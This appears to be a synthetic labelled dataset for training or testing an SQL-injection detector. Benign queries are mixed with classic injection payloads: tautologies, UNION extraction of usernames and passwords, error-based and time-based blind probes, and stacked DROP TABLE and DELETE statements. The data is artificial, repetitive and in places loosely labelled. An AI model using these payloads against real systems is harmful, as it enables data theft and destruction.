query_text,label,category
' OR ''=',1,comment_bypass
SELECT * FROM test_transactions WHERE amount > 631 AND amount < 3331,0,benign
"SELECT id FROM sessions WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
admin'#,1,comment_bypass
INSERT INTO test_customers (name) VALUES ('jane'),0,benign
SELECT * FROM orders WHERE id = 373 OR '1'='1',1,tautology
SELECT * FROM test_customers WHERE id = 234 OR '1'='1',1,tautology
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
' UNION SELECT @@version--,1,union_based
1; DELETE FROM test_orders;--,1,stacked_queries
"SELECT id FROM test_customers WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
"SELECT * FROM orders WHERE id = 481 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
SELECT * FROM test_orders WHERE status = 'active' OR status = 'pending',0,benign
SELECT * FROM customers WHERE id = 784,0,benign
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
"SELECT id FROM sessions WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
SELECT * FROM customers WHERE id = 690,0,benign
SELECT item FROM test_transactions WHERE item = 'smith',0,benign
SELECT * FROM customers WHERE amount > 723 AND amount < 4741,0,benign
"SELECT * FROM test_transactions WHERE id = 801 UNION SELECT username, password FROM users--",1,union_based
"SELECT * FROM test_transactions WHERE id = 856 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
SELECT item FROM customers WHERE item = 'jane',0,benign
DELETE FROM test_orders WHERE id = 274,0,benign
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
INSERT INTO test_orders (item) VALUES ('corp'),0,benign
INSERT INTO test_orders (amount) VALUES ('acme'),0,benign
SELECT * FROM sessions WHERE id = 594,0,benign
SELECT COUNT(*) FROM sessions WHERE email IS NOT NULL,0,benign
'; INSERT INTO customers VALUES ('hacked');--,1,stacked_queries
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,blind_time_based
SELECT * FROM test_orders WHERE status = 'active' OR status = 'pending',0,benign
INSERT INTO test_transactions (id) VALUES ('john'),0,benign
' OR 1=1#,1,tautology
' UNION SELECT @@version--,1,union_based
admin'--,1,comment_bypass
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
SELECT * FROM sessions WHERE name LIKE '%john%',0,benign
admin'--,1,comment_bypass
INSERT INTO sessions (item) VALUES ('acme'),0,benign
acme; DROP TABLE customers;--,1,stacked_queries
SELECT * FROM sessions WHERE amount > 936 AND amount < 4862,0,benign
INSERT INTO customers (id) VALUES ('acme'),0,benign
'; INSERT INTO test_transactions VALUES ('hacked');--,1,stacked_queries
ltd; DROP TABLE customers;--,1,stacked_queries
SELECT * FROM orders WHERE name LIKE '%jane%',0,benign
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
"SELECT * FROM customers WHERE id = 545 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
SELECT * FROM customers ORDER BY name DESC LIMIT 10,0,benign
SELECT * FROM test_customers WHERE id = 288 OR '1'='1',1,tautology
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
SELECT * FROM test_transactions ORDER BY name DESC LIMIT 10,0,benign
' OR ''=',1,comment_bypass
SELECT * FROM test_transactions WHERE id = 128 OR '1'='1',1,tautology
SELECT * FROM test_orders WHERE id = 11 AND SLEEP(5),1,blind_time_based
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
UPDATE sessions SET status = 'test' WHERE id = 410,0,benign
SELECT * FROM test_transactions WHERE id = 309,0,benign
UPDATE customers SET email = 'gadget' WHERE id = 642,0,benign
UPDATE test_customers SET status = 'test' WHERE id = 730,0,benign
'; INSERT INTO test_customers VALUES ('hacked');--,1,stacked_queries
UPDATE test_orders SET item = 'widget' WHERE id = 10,0,benign
admin' OR '1'='1'--,1,tautology
SELECT * FROM orders ORDER BY id DESC LIMIT 10,0,benign
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
SELECT COUNT(*) FROM test_orders WHERE amount IS NOT NULL,0,benign
' OR ''=',1,comment_bypass
INSERT INTO test_orders (item) VALUES ('gadget'),0,benign
SELECT * FROM test_customers WHERE id = 751 OR 'a'='a',1,tautology
admin'--,1,comment_bypass
' UNION SELECT @@version--,1,union_based
' OR ''=',1,comment_bypass
SELECT COUNT(*) FROM customers WHERE id IS NOT NULL,0,benign
UPDATE test_orders SET item = 'corp' WHERE id = 105,0,benign
SELECT id FROM test_orders WHERE id = 'john',0,benign
DELETE FROM customers WHERE id = 250,0,benign
SELECT * FROM orders WHERE name LIKE '%corp%',0,benign
UPDATE test_orders SET amount = 'ltd' WHERE id = 696,0,benign
"SELECT * FROM test_orders WHERE id = 492 UNION SELECT username, password FROM users--",1,union_based
UPDATE orders SET item = 'gadget' WHERE id = 733,0,benign
UPDATE test_customers SET status = 'smith' WHERE id = 180,0,benign
admin'--,1,comment_bypass
DELETE FROM orders WHERE id = 800,0,benign
1; DELETE FROM test_customers;--,1,stacked_queries
SELECT * FROM test_transactions WHERE name LIKE '%jane%',0,benign
"SELECT amount FROM test_orders WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
' OR ''=',1,comment_bypass
SELECT * FROM test_transactions WHERE id = 535 AND SLEEP(5),1,blind_time_based
test; DROP TABLE test_transactions;--,1,stacked_queries
1; DELETE FROM orders;--,1,stacked_queries
1; DELETE FROM test_orders;--,1,stacked_queries
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
SELECT * FROM sessions WHERE name LIKE '%corp%',0,benign
SELECT status FROM customers WHERE status = 'smith',0,benign
SELECT * FROM test_transactions WHERE name LIKE '%jane%',0,benign
DELETE FROM test_transactions WHERE id = 953,0,benign
SELECT * FROM test_orders WHERE name = '' OR 1=1--,1,tautology
' UNION SELECT @@version--,1,union_based
DELETE FROM customers WHERE id = 827,0,benign
SELECT * FROM test_customers WHERE id = 970 AND SLEEP(5),1,blind_time_based
' OR 1=1#,1,tautology
SELECT COUNT(*) FROM test_orders WHERE email IS NOT NULL,0,benign
SELECT * FROM test_orders WHERE status = 'active' OR status = 'pending',0,benign
UPDATE test_customers SET amount = 'smith' WHERE id = 282,0,benign
SELECT * FROM test_customers WHERE id = 671 AND SLEEP(5),1,blind_time_based
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
ltd; DROP TABLE test_transactions;--,1,stacked_queries
"SELECT * FROM orders WHERE id = 96 UNION SELECT username, password FROM users--",1,union_based
'; INSERT INTO customers VALUES ('hacked');--,1,stacked_queries
SELECT * FROM test_customers WHERE status = 'active' OR status = 'pending',0,benign
SELECT * FROM test_orders ORDER BY status DESC LIMIT 10,0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
DELETE FROM customers WHERE id = 238,0,benign
SELECT item FROM customers WHERE item = 'jane',0,benign
SELECT COUNT(*) FROM test_customers WHERE item IS NOT NULL,0,benign
admin'#,1,comment_bypass
admin' OR '1'='1'--,1,tautology
admin'--,1,comment_bypass
"SELECT email FROM sessions WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
SELECT COUNT(*) FROM test_orders WHERE amount IS NOT NULL,0,benign
SELECT * FROM orders WHERE name = 'admin'--' AND password = 'test',1,comment_bypass
DELETE FROM customers WHERE id = 825,0,benign
SELECT * FROM sessions WHERE amount > 44 AND amount < 2178,0,benign
